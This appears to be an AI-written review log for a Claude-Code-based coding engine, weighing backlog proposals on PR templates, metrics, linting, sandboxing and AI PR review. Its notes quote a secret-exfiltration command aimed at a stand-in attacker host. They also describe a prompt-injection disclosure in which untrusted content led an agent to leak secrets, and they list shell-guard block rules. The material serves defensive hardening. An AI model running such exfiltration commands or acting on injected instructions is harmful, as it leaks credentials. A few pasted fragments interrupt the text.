verdicts.title: PR template (.github/pull_request_template.md)
verdicts.fit: Plan §8.3 already declares the PR template 'mandatory, checked by evaluator' and CLAUDE.md §5 says 'follow the operator PR description template verbatim' — yet the canonical template exists only as one prose line in the plan; materializing it as .github/pull_request_template.md is a lean, zero-dependency single file that gives agents, the evaluator, and any web-created PR one canonical artifact (P3: operator-facing consistency). Split: adopt the core template (What this does / How to see it / What could be risky / Machine checks + technical fold); REJECT the agent-authored disclosure checkbox (in a 100%-AI-coded repo every PR is agent-authored by constitution — the checkbox is noise, and agent-role attribution already lives in PROGRESS.md) and SKIP PR-size-label automation (needs a labeler workflow, new CI surface for a solo private repo). Note: agents open PRs via gh with explicit bodies, so the file's mechanical pre-fill mainly covers human/web PRs — its main value is being the single source the evaluator checks against.

verdicts.title: LICENSE
verdicts.fit: Genuinely the human's call (licensing is a legal/business choice), but the assessment: the repo is already flagged as a GitHub *template repository* (DECISIONS.md 2026-06-09), and with no license, default copyright applies — nobody else may legally reuse it, so the 'unusable as a template' framing is accurate the moment anyone but the operator touches it. For an embedded template whose LICENSE file gets copied into every scaffolded downstream repo, MIT (or MIT-0 to drop the attribution-retention burden in copies) is the lower-friction conventional choice; Apache-2.0's explicit patent grant and NOTICE mechanics only earn their weight if the engine accumulates substantial original code worth patent-defending. Zero urgency while private/solo, but it is a one-file add that should land before any sharing or the public flip.

verdicts.title: Checkpointing & resume semantics (roadmap/checkpoints/)
verdicts.fit: The capability this asks for already exists through the engine's own primitives, and a separate checkpoints/ dir would be redundant duplicate state violating the single-writer/file-based design: features.json holds status=in_progress + attempts (only writable via update-state.ts), PROGRESS.md's prepended block carries the 'exact next step' and is injected into every new session by the SessionStart hook, the feat/<id> branch holds committed code, and the Stop hook refuses to end a session without committed+pushed work and a fresh PROGRESS entry — that IS the mid-feature checkpoint contract. The LangGraph framing is accurate about LangGraph but irrelevant: its DB-backed checkpointers serve a graph runtime, while this engine's durable store is git + two state files, per plan §2.1 first-party-primitives-only. The 'promotion PR as durable interrupt' is already the documented model (App-authored develop→main PRs, plan §7.4 / DECISIONS Promotion #1); per-tool-call checkpointing would be pure token/IO overhead.
verdicts.already_done: features.json in_progress status + attempts via update-state.ts; PROGRESS.md handoff blocks + SessionStart injection (session-brief.sh); commit-on-stop.sh Stop hook (committed+pushed+fresh entry required); /work SKILL.md step 7; DECISIONS.md Promotion #1 entry.

claims.claim: LangGraph models interrupts as durable checkpointed pauses resumed via Command(resume=...)
claims.note: Accurate as LangGraph doctrine; inapplicable architecture for a Claude-Code-first-party file/git engine.

claims.claim: The engine lacks defined mid-feature stop/resume state
claims.note: Stop hook + prepend-with-next-step + SessionStart injection of top ~50 PROGRESS lines define exactly what must exist when a session stops.

claims.claim: State-machine validity of feature transitions is untested
claims.note: Invariants (done⇒passes, blocked⇒reason, born-failing) are enforced and contract-tested; an explicit transition matrix (e.g. done→pending banned) is not, but that gap is minor, not a checkpoints/ dir.

verdicts.title: Deterministic workspace reset (git reset --hard origin/develop in retry loop)
verdicts.fit: The underlying problem is real — /work step 5 sends a second attempt 'back to step 3' without saying what happens to the dirty attempt-1 branch — but reset --hard is the wrong instrument: it would destroy the attempt-1 work the evaluator's findings reference (most retries are incremental fixes, per the manager-mindset 'fix the conditions then retry'), and normalizing a destructive command in agent habit cuts against the engine's guard posture even though guard-bash.sh doesn't currently block it. Right shape: one sentence in /work — incremental evaluator findings continue on the existing branch; a corrupted/unsalvageable workspace means delete the branch and re-branch fresh from origin/develop (step 3 already mandates fetch-then-branch), which gives the same determinism with no destructive reset and no snapshot ceremony.

claims.claim: guard-bash blocks git reset --hard
claims.note: Guard blocks stable-branch pushes, force pushes (+refspec), rm -rf of home/root, .env reads, pipe-to-shell, publishing, shield bypass — reset --hard is allowed; the objection is philosophical, not mechanical.

claims.claim: Retry loop currently lacks explicit workspace-state semantics between attempts
claims.note: Step 3 branches fresh from origin/develop on first attempt; step 5's 'back to step 3' is ambiguous about the existing branch on attempt 2.

verdicts.title: Snapshot tests for generated text
verdicts.fit: The cited codex rule is real (insta snapshot coverage required for user-visible TUI changes) but the conditional premise fails here: the engine's user-facing text (STATUS.md, PR bodies, QA scripts) is LLM-generated per session — non-deterministic, so snapshot tests are the wrong tool (that's the rubric-eval domain, item #29) — while its deterministic outputs (verify.sh markers, update-state errors, hook block messages) are already pinned by the 63 hook contract tests asserting exact strings. Revisit only if a deterministic text generator (e.g. a status templater script) is ever added.

verdicts.title: Session metrics as data (roadmap/metrics.jsonl consumed by /kaizen and /status)
verdicts.fit: This is exactly the lean, file-based-state shape the engine wants (P4): one appended JSONL record per /work session at the RECORD step, giving /kaizen a measurable 'did the metric move' feed (its SKILL.md step 4 already demands checking a metric next kaizen but has nowhere to read it from) and letting /status auto-fill its mandated cost/health line instead of reconstructing it from PROGRESS prose plus gh CLI calls. One caveat to note at implementation: the tokens/cost field should be best-effort/optional, since precise per-session cost is only first-party-available via /usage (interactive) or OTel metrics (claude_code.cost.usage), not via a clean in-session API; everything else (features attempted/done, attempts, evaluator/security verdicts, CI result) is already known to the orchestrator at step 7. Keep it to emission + consumption — no dashboards (those stay Phase 5 per the plan).

verdicts.title: Trace-level JSONL trajectories + OTel-compatible shape + trace_log schema field
verdicts.fit: The item's factual scaffolding is current (env var and exporter vars all real), but its dominant recommendation — hand-rolling per-LLM/tool-call JSONL trajectories with trace IDs and a trace_log schema field — duplicates two first-party mechanisms and so violates P4 (Claude-Code-first-party primitives only, lean core, token-efficient): Claude Code already persists full local JSONL session transcripts under ~/.claude/projects, and as of the current docs it natively exports not just metrics/events but beta distributed TRACES (spans linking each prompt to its API requests and tool executions, TRACEPARENT inherited by Bash subprocesses) — flipping documented env vars is zero code, a custom trace logger is permanent maintenance. The 'OTel-compatible shape' selling point is also weaker than claimed because GenAI semantic conventions are still in Development status, so any hand-built shape chases a moving target; and the plan already defers monitoring/telemetry integrations to Phase 5 (line 414). Salvageable slivers, both elsewhere: #26 supplies the lean structured layer, and a one-line Phase-5 doc pointer to the native OTel env vars covers the 'production sink' part — neither justifies adopting this item.

verdicts.title: Engine eval suite / agent regression harness (evals/ + promptfoo)
verdicts.fit: The gap is real and exactly matches P5: hooks have 63 green contract tests while the evaluator/security-reviewer/orchestrator prompts — the graders that the whole evidence-gate rests on — have zero behavioral tests, and the tooling cited is current. But the item as written is platform-building (nightly benchmark, leaderboard, companion repo, A/B rule optimization) that violates P4 lean/token-efficient. Shape for THIS engine: (1) the deterministic fixtures — guard-bash paraphrase/evasion corpus, forbidden-direct-edit, state-mutation tasks — belong in the existing hook-contract test suite at zero token cost, not an LLM harness (the evasion corpus also gives DECISIONS.md accepted-risk ④ its measured ceiling); (2) a minimal evals/promptfooconfig.yaml covering ONLY evaluator behavior (weakened-assertion / forged-and-stale-evidence / unmapped-criteria fixtures) and security-reviewer BLOCK fixtures (seeded IDOR/secret-leak), run via promptfoo-action solely on PRs touching .claude/** with advisory thresholds and JSON results under roadmap/evidence/ — noting this requires a new raw ANTHROPIC_API_KEY repo secret billed at API rates OUTSIDE both the subscription and the Jun-15 agent credit pool (plan §5.2), i.e. a new billing surface needing a DECISIONS.md entry and operator cost sign-off, which is also why the cheaper-seeming alternative of headless `claude -p` graders is worse (it drains the capped credit pool that the CI-autofix lane depends on); (3) reject the nightly cadence, leaderboard, companion-repo split, and Arize-style A/B optimization of rule wordings as premature scale — revisit post-Phase-1. Adopt pydantic-evals as framing only (grade internal behavior from evidence artifacts/PROGRESS entries, which are already file-based in this engine) — the library itself is Python/OpenTelemetry and foreign to this stack. Note the overlap: weakened-assertion detection is partly cheaper as the deterministic assertion-shield gaps already on the backlog (.skip/.only, weakened-expected-value) than as eval coverage.

verdicts.title: Prompt/skill/brief formalization as versioned data
verdicts.fit: Four sub-parts with different fates; the dominant actionable piece is the briefs template, reshaped onto first-party primitives. (a) roadmap/briefs/TEMPLATE.md: adopt immediately — near-zero cost, the briefs dir is already load-bearing (plan §5.5 file map names roadmap/briefs/F-XXXX.md; /downtime step 3 writes them; /work step 2 consumes them; F-0007's path-guard design expects briefs to carry the CLAUDE_ACTIVE_FEATURE + authorized/forbidden-path contract), and the template's fields should be lifted verbatim from /work step 2 rather than invented. (b) Skill formalization: right instinct, wrong schema — use Claude Code's own frontmatter (verified current today): `arguments`/`argument-hint` give /qa-pack its since=<tag> parameter first-party; `disallowed-tools` is the tool-limiting field (note `allowed-tools` GRANTS permission rather than restricting, and disallowed-tools clears on the next user message — so frontmatter is convenience, never the security boundary; hooks/permissions remain that, per P5/plan §6). (c) Reject importing goose's version/env_keys/available_tools fields or CrewAI agents.yaml/tasks.yaml — both schemas are real but they are foreign primitives in a P4 Claude-Code-first-party engine whose agents are .md-with-frontmatter; secrets are environment-level here by design. (d) 'Version prompts as files, never inline' is already the repo's reality — every prompt lives as a checked-in file under .claude/ — so that sub-part is already-done, not work.

claims.note: All four fields confirmed (version defaults 1.0.0; parameters with input_type string/number/boolean/date/file/select; extension available_tools allowlist; extension env_keys secrets-by-name). Caveat: the canonical block.github.io recipe-reference URL now returns 404 — docs appear to have moved; goose itself remains active (https://github.com/block/goose).

NO version field, no typed parameters, no env_keys — so the goose-shaped sub-asks have no first-party equivalent and should be dropped, while parameters/tool-limits do.

verdicts.title: Bash output pagination / ACI shell
verdicts.fit: Claude Code already middle-truncates Bash output at 30,000 chars natively, with BASH_MAX_OUTPUT_LENGTH as a first-party knob if the engine ever wants tighter budgets — a custom pagination layer duplicates the platform (P4: first-party primitives only), and the SWE-agent scroll_down ACI plus a bespoke aci-edit.ts CLI is exactly the hand-rolled pre-2026 agent-harness pattern the plan's intro explicitly rejected. The recommendation is also technically mis-specified: guard-bash.sh is a PreToolUse hook and cannot touch outputs at all (output rewriting would need PostToolUse updatedToolOutput). If output budgets ever pinch, set BASH_MAX_OUTPUT_LENGTH in settings env — zero engine code.

Concrete reshape: (a) a ~20-line stateful check inside guard-bash.sh — hash the last N Bash commands to a temp file and exit-2 with a 'you are looping; change approach or strike the feature' nudge after 3 consecutive identical failing commands; (b) promote the two-strike cap from prose (plan §6.4 / CLAUDE.md selection rule) into the existing enforcement point, update-state.ts, as a named constant/config. Low priority — frontier models (P1) plus bounded sessions plus the existing two-strike cap already bound the damage, so this is a kaizen-sized item, not core work.

verdicts.title: Fork 7: Automated AI PR review — adopt vs trust-policy-first
verdicts.fit: The fork itself notes the positions are compatible when restricted to diff analysis, and Anthropic's claude-code-security-review action is exactly that (analyzes diffs, never executes PR code) — but its own README says it is not prompt-injection-hardened and should review trusted PRs only, vindicating the R3/R4 caution as the binding constraint. Today every PR is App-authored by the engine's own agents and already passes an in-session evaluator + security-reviewer, so a CI-side review pass duplicates coverage at token cost (P4); sequence it to the public flip / first external contributors, locked to same-repo non-draft PRs with persist-credentials:false, and keep the rule that nothing executes untrusted PR code without a written trust policy.

adjustments.reason: Keep shellcheck + actionlint as adopt-now exactly as shaped (CI hard gate, command-v soft-skip locally, matching verify.sh's existing pytest idiom at scripts/verify.sh:54), but carve out the two riders. (1) zizmor must move to adopt-later: since v1.20.0 its DEFAULT unpinned-uses policy requires hash-pinning on ALL actions (https://docs.zizmor.sh/audits/), so out of the box it permanently flags ci.yml/e2e.yml, which are tag-pinned by documented decision (roadmap/DECISIONS.md 2026-06-09, Dependabot rolls the tags). Adopting it now forces either a .zizmor.yml exception config — contradicting B-11's own 'no config files' premise — or reversing a documented decision. Adopt it when the tags→SHA migration happens or alongside a deliberate config; this also resolves the internal conflict with K-3/J-23/O-gap-04, which the same fleet marked adopt-now while deferring zizmor. (2) Drop shfmt entirely rather than 'optional': pure style churn on six small contract-tested scripts, generating diff noise (a token tax) on every future hook PR with zero safety value. zizmor itself verified current and healthy (zizmorcore, v1.0.0 Jan 2026; Trail of Bits hardening 2026-05-22: https://blog.trailofbits.com/2026/05/22/we-hardened-zizmors-github-actions-static-analyzer/), so the deferral is sequencing, not staleness.

Adopt only the lint half, and only for the engine's own TS: Biome (verified current at 2.4.x — https://biomejs.dev/blog/biome-v2-4/) as one devDependency + minimal biome.json, wired as a verify.sh engine meta-gate (biome ci over scripts/*.ts), closing the real engine-TS lint gap (scripts/verify.sh:41 template-mode skip). Two refutations of the rest: (1) the 'pre-positions the hard product-mode gate' claim is wrong — verify.sh is deliberately stack-aware (Cargo/pytest branches exist) and the product stack is unknown; a Python/Rust product gets nothing from Biome, so the engine's 2-3 TS scripts are the sole justification and scope must stay there. (2) The PostToolUse format hook should NOT ride along as a 'sequenced second step': a per-Edit/Write process spawn plus a new hook-contract-test surface buys nothing that the verify-time biome gate doesn't already enforce at the existing single chokepoint. The plan §6.3 deferral was a documented lean decision; the leaner closure is to re-record it (hook activates at Phase 1 when product-mode formatting actually pays), not to dissolve it. Hook = adopt-later, explicitly.

notes: CONFIRMED #1 (PR template): survives the lean test — one .github file, zero deps, zero always-loaded context (GitHub serves it only at PR-creation; agents pass explicit gh bodies). It materializes an artifact the constitution already mandates (plan §8.3, CLAUDE.md §5) so the evaluator checks against one canonical source instead of prose; also the only guidance a web-created operator PR gets (P3). The item's own split (reject disclosure checkbox, skip size-label automation) is already the lean call.

CONFIRMED #26 (metrics.jsonl): refutation failed — this REDUCES token cost rather than adding it. Both consumers are verified real and currently unfeedable: .claude/skills/kaizen/SKILL.md step 4 demands 'check that metric next kaizen' with no machine source, and .claude/skills/status/SKILL.md mandates a cost line now reconstructed from prose + gh calls. One JSONL line per session is negligible growth and pure P4 file-based state. Lean constraints: emit in the same RECORD step that writes PROGRESS.md (no new step), fields limited to what the orchestrator already holds at step 7, cost field best-effort (verified: claude_code.cost.usage is OTel-export-only, no in-session API — https://code.claude.com/docs/en/monitoring-usage), no schema file, no dashboards.

CONFIRMED #41 (dangerous naming): one line, zero deps, zero operator burden, real greppability win for guard-bash. Premise correction in the verdict is accurate (guard-bash.sh:55 blocks ASSERTION_SHIELD_BYPASS; DECISIONS.md 2026-06-09 documents the self-bypass fix). Lean rider: explicitly SKIP renaming the existing env var — it would churn hook contract tests for zero safety gain; the convention binds future overrides only. CLAUDE.md is 44 lines, so one §6 line fits the budget; a rules file is equally fine.

CONFIRMED #46 (exfil guard patterns): precedent verified current — Microsoft Security Blog 2026-06-05 (https://www.microsoft.com/en-us/security/blog/2026/06/05/securing-ci-cd-in-agentic-world-claude-code-github-action-case/): Anthropic's fixes included a custom gh wrapper that 'validates arguments and blocks exfiltration-capable URL patterns'; the real attack put secrets in URL paths (gh issue view https://attacker.com/<secret>), matching the item's URL-paths-and-POST-bodies shaping. Gap confirmed: .claude/hooks/guard-bash.sh has no exfil patterns. Defense-in-depth survives the skeptic test because repo hooks also run under claude-code-action in CI, where no sandbox network allowlist exists. Lean constraints: fixed small pattern set targeting the verified shapes (secret-shaped strings/secret env interpolation in curl/wget/gh URLs or POST bodies; non-GET gh api to non-GitHub hosts), contract tests proving the downtime sentinel's legitimate gh api calls still pass, and honest framing as a deterrent layer per the repo's own accepted-risk #4 (DECISIONS.md 2026-06-09).

CONFIRMED #50 (config tripwires): upstream mirror verified — anthropics/claude-code-action/.github/workflows/non-write-users-check.yml exists and warns on allowed_non_write_users additions. Zero-dep, zero-token diff grep. Lean shape: implement as a step inside the existing ci.yml (not a new workflow file), and prefer hard-fail over the upstream's warn-comment — P5 default-FAIL, nothing should ever legitimately add these keys, and hard-fail avoids needing comment-write permissions. Include .mcp.json-touch detection (directly motivated by GHSA-8q5r-mmjf-575q, the only published claude-code-action advisory).

CONFIRMED K-3 (fork-3 resolution): shellcheck+actionlint now / zizmor adopt-later is exactly right, and its factual correction is verified — zizmor is a single actively-maintained tool (zizmorcore, v1.0.0 Jan 2026, ToB hardening May 2026), not 'complex third-party infrastructure'. My B-11 finding supplies the additional concrete reason adopt-later is correct: zizmor's default unpinned-uses policy (hash-pin ALL actions since v1.20.0) collides with the repo's documented tag-pin decision and needs a config the repo shouldn't carry yet.

CONFIRMED O-gap-01 (run F-0002): immune to lean objections — it adds no files, deps, or context; it executes the loop that already exists and is the repo's stated next step. The stale sub-claims are correctly marked stale (verify.sh:40-45 loud skips, :69-71 --e2e hard-fail; product/template distinction explicit).

CONFIRMED O-gap-04 (guardrail static analysis): gap is real — no shellcheck/actionlint anywhere in the repo, engine-TS lint skipped at verify.sh:41. Confirm with the harmonized shape: shellcheck+actionlint now per B-11-as-adapted; the engine-TS lint half closes via the B-12 adaptation (verify-time Biome gate); zizmor/codeql fleet deferred per J-23. actionlint verified current (https://github.com/rhysd/actionlint/releases, Go 1.26 support); shellcheck ships preinstalled on GitHub ubuntu runner images, so the CI step needs no install.

CONFIRMED all J-items (J-01, J-03, J-06, J-07, J-08, J-09, J-10, J-11, J-12, J-14, J-15, J-17, J-18, J-19, J-23, J-24) with ONE binding lean constraint on implementation: an avoid-list endorsement must cost zero always-loaded context. Record adoption of feedback §J as guidance in a single roadmap/DECISIONS.md entry (the repo's ADR-lite idiom) — NOT as 16 new lines in the 44-line CLAUDE.md and NOT as new .claude/rules/ files. Several are effectively already-done/no-op (J-11 and J-19 are verbatim plan §2.1 positions; J-03's promotion authority is the documented Promotion #1 pattern in DECISIONS.md), which makes them free to endorse and pointless to re-document per-item. J-15 binds #26's metrics.jsonl only if data ever leaves the repo — a local roadmap file is state, not telemetry. J-17 is the correct constraint on #64; J-23 is consistent with my B-11/K-3 zizmor carve.

CROSS-ITEM CONSISTENCY NOTE for the parent: the adopt-now list contained an internal contradiction on zizmor timing (B-11 'now' vs K-3/J-23/O-gap-04 'later'). The B-11 adjustment resolves it in K-3's direction with a new verified reason (default unpinned-uses policy vs documented tag-pinning). After adjustment, the scanner story is one consistent shape: shellcheck+actionlint immediately, Biome at verify-time for engine TS, zizmor when SHA-migration or a deliberate config lands, semgrep/codeql at product-source time.

If your repository already uses AGENTS.md for other coding agents, create a CLAUDE.md that imports it (@AGENTS.md) so both tools read the same instructions", or use a symlink (which on Windows needs admin/Developer Mode, so the import is recommended). /init in a repo with AGENTS.md will read it and fold it into a generated CLAUDE.md. adjustments.new_verdict: reject graph orchestration and default parallelism (agree with addendum)
adjustments.reason: P4 is explicit — ONE orchestrator, file-based state, disposable sub-agents, parallelism opt-in never default — and the repo's DECISIONS.md avoid-list already encodes this rejection; graph frameworks add a runtime dependency, context bloat, and concurrent-state-mutation risk to a deliberately linear, token-efficient loop, so R2's position is the one to drop. Effectively already-decided in-repo.

adjustments.new_verdict: reject MCP-server migration; defer the registry too until the first real external tool (mostly agree with addendum)
adjustments.reason: Wrapping update-state.ts/assertion-shield.ts in a local JSON-RPC server violates plan §2.1 (Claude-Code-first-party primitives only) and current MCP docs position MCP for external integrations, not local scripts — worse, those scripts are invoked deterministically by hooks/CI, and making them model-discretionary MCP tools weakens the evidence gate (P5). I diverge from the addendum on shipping docs/tool-registry.md + .claude/tool-policy.json NOW: with zero external tools connected they are dead weight in a lean drop-in core — write the registry/trust-policy as the mandatory prerequisite the moment the first external MCP server is proposed, not before.

adjustments.new_verdict: shellcheck+actionlint now (CI hard gate, verify.sh soft-skip); zizmor next CI touch; semgrep/codeql defer until src/ exists (agree with addendum, one refinement)
adjustments.reason: The hooks and workflows ARE this engine's product surface, so linting them now is in-scope even pre-product; both tools verified current (actionlint v1.7.12 Apr 2026, zizmor v1.25.2 May 2026). Reshape for the Windows operator (P3): hard-gate in CI on the ubuntu runner, soft-skip locally in verify.sh when the binary is absent. One refinement to the addendum: zizmor does not belong lumped with semgrep/codeql 'fleets' — it is a single SHA-pinned CI job (zizmor-action) targeting exactly this repo's live threat class (template injection, credential persistence — cf. June 2026 claude-code-action disclosures), so adopt it at the next CI change rather than deferring to product phase; semgrep/codeql genuinely wait for src/.

adjustments.new_verdict: adopt-later via first-party Claude Code sandboxing, not bespoke Docker (side with R3 on sequencing; no addendum position)
adjustments.reason: Claude Code now ships native OS-level sandboxing (bubblewrap/seatbelt, WSL2-supported, sandbox-runtime OSS preview), so a bespoke Docker harness violates P4 first-party-primitives-only and is a heavy lift for a non-technical operator on Windows 11 Home (P3); current risk is already mitigated by guard-bash + permission gates + the cloud-sandbox posture. Sequence it as R3 framed it — a 1+-week initiative triggered when untrusted PR/code execution work actually begins — and implement via /sandbox + WSL2/devcontainer rather than custom containers.

adjustments.new_verdict: adopt-later, gated on branch protection Q-0001; guardrail-path map enforced on main only (side with R7's conditionality, R3/R4's scope)
adjustments.reason: CODEOWNERS without 'require code-owner review' branch protection is inert documentation, and protection is the operator's pending task Q-0001 — so shipping it now buys nothing; when Q-0001 lands, use the guardrail-path map (CLAUDE.md, .claude/**, scripts/**, workflows, features.schema.json) but enforce it on main only, where the operator already approves App-authored promotion PRs in the zero-CLI flow, never on develop, where required human review would block the autonomous loop and violate P2.

adjustments.new_verdict: reject src/packages restructuring now; layout decided when product code lands (side with R4/R7; no addendum position)
adjustments.reason: No src/ exists yet and verify.sh already flips to product-mode hard gates the moment one appears, so the seam is built; this template is a drop-in control plane (P4) that must not impose a monorepo/workspace layout on whatever downstream product repo it is embedded in — R1's restructuring is premature speculation with real lockfile/tooling weight.

adjustments.new_verdict: adopt — diff-analysis-only AI review with claude.yml-style trust gates (both camps reconcile, as §K itself notes)
adjustments.reason: The positions are compatible exactly as the feedback concedes: adopt anthropics/claude-code-security-review-style diff analysis on sensitive paths as an independent reviewer (strengthens P5 — the in-session evaluator is same-session, so an out-of-session check counters self-grading), but bind it to R3/R4's constraints, which the repo's claude.yml already materializes (SHA-pin, human-actor/write-access gate, persist-credentials:false, same-repo non-draft PRs, never execute PR code); the June 5 2026 Microsoft disclosure (untrusted-content secret exfil, fixed in Claude Code 2.1.128) proves this constraint set is current necessity, not paranoia — also require runtime >=2.1.128 in the workflow.

notes: fork-5 is partially operator-decision: the trigger (enabling required-review branch protection) is the operator's open task Q-0001; the agent-side resolution above only defines what to ship once the operator flips it.

Addendum mapping mismatch: the addendum's 'Fork 4: License Selection' is actually open question §L-1, not §K fork 4 (Docker sandbox) — §K forks 4–7 received no addendum resolution. The license itself is operator-decision per the feedback's own §A-3; Apache-2.0 is a sound default recommendation for an embeddable template (patent grant), but choosing a license is legally the owner's call.

Factual caveat for fork-7 inputs: item #10's 'v1.0.94 floor' for claude-code-action remains unsupported by any published advisory (only GHSA-8q5r-mmjf-575q, <1.0.74); a June 2026 Hacker News piece mentions 'hardening through spring in v1.0.94' narratively, and the separate Microsoft June 5 2026 disclosure is fixed in the Claude Code RUNTIME at 2.1.128, not an action version — any CI assertion should floor the runtime version, not invent an action-SHA floor.
